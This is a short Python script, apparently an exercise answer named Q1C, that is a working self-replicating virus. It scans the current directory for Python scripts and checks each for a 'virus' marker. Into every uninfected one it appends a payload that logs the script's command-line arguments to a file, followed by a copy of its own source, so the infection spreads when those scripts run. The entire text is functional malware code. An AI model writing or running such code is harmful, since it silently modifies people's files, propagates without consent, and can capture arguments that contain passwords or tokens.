import os, sys
   
directory = os.listdir(path=".")


pythonFiles = []
for f in directory:
    if ".py" in f:
        pythonFiles.append(f)
   
for pyfile in pythonFiles:
    hasVirus = False
    isScript = False
 
    myfile = open(pyfile, "r")


    lines = [i.strip() for i in myfile.readlines()]


    if "if __name__ == \"__main__\":" in lines:
        isScript = True


    for line in lines:
        if "virus" in line:
            hasVirus = True


    myfile.close()


    writefile = open(pyfile, "a+")
    addonFile = open("Q1C.py", "r")    
    virusList = ["\n#virus", "\nimport sys", "\nvirusfile = open(\"Q1C.out\", \"a+\")", "\nfor i in sys.argv: virusfile.write(i + ' ')", "\nvirusfile.write(\"\\n\")", "\nvirusfile.close()"]
   
    if isScript and not hasVirus:
        for line in virusList:
            writefile.write(line)
   
        writefile.write("\n\n")
        addonLines = addonFile.readlines()


        for line in addonLines:
            writefile.write(line)


    addonFile.close()
    writefile.close()
